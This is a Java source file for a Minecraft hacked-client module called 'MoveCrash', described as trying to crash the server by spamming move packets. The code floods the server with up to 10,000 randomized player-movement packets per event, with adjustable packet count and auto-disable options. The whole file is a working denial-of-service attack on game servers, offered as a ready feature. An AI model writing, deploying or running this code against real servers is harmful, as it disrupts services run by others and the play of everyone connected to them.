package me.dustin.crash.feature;

import me.dustin.events.core.EventListener;
import me.dustin.events.core.annotate.EventPointer;
import me.dustin.jex.event.filters.PlayerPacketsFilter;
import me.dustin.jex.event.filters.TickFilter;
import me.dustin.jex.event.misc.EventTick;
import me.dustin.jex.event.player.EventPlayerPackets;
import me.dustin.jex.feature.mod.core.Feature;
import me.dustin.jex.feature.option.annotate.Op;
import me.dustin.jex.helper.misc.ChatHelper;
import me.dustin.jex.helper.misc.Wrapper;
import me.dustin.jex.helper.network.NetworkHelper;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.util.math.Vec3d;

import java.util.Random;

@Feature.Manifest(category = Feature.Category.MISC, description = "Tries to crash the server by spamming move packets. (By 0x150)")
public class MoveCrash extends Feature {

    @Op(name = "Packet Count", min = 1, max = 10000, inc = 10)
    public int packetCount = 2000;
    @Op(name = "Auto Disable")
    public boolean autoDisable = true;

    public MoveCrash() {
        setFeatureCategory(Category.valueOf("CRASH"));
    }

    @EventPointer
    private final EventListener<EventPlayerPackets> eventPlayerPacketsEventListener = new EventListener<>(eventPlayerPackets -> {
        try {
            Vec3d current_pos = Wrapper.INSTANCE.getLocalPlayer().getPos();
            for (int i = 0; i < packetCount; i++) {
                PlayerMoveC2SPacket.Full move_packet = new PlayerMoveC2SPacket.Full(current_pos.x + getDistributedRandom(1), current_pos.y + getDistributedRandom(1), current_pos.z + getDistributedRandom(1), (float) rndD(90), (float) rndD(180), true);
                NetworkHelper.INSTANCE.sendPacket(move_packet);
            }
        } catch (Exception ignored) {
            ChatHelper.INSTANCE.addClientMessage("Stopping movement crash because an error occurred!");
            setState(false);
        }
    }, new PlayerPacketsFilter(EventPlayerPackets.Mode.POST));

    @EventPointer
    private final EventListener<EventTick> eventTickEventListener = new EventListener<>(eventTick -> {
        if (Wrapper.INSTANCE.getWorld() == null || Wrapper.INSTANCE.getLocalPlayer() == null && autoDisable)
            setState(false);
    }, new TickFilter(EventTick.Mode.PRE));

    private double rndD(double rad) {
        Random r = new Random();
        return r.nextDouble() * rad;
    }

    private double getDistributedRandom(double rad) {
        return (rndD(rad) - (rad / 2));
    }
}
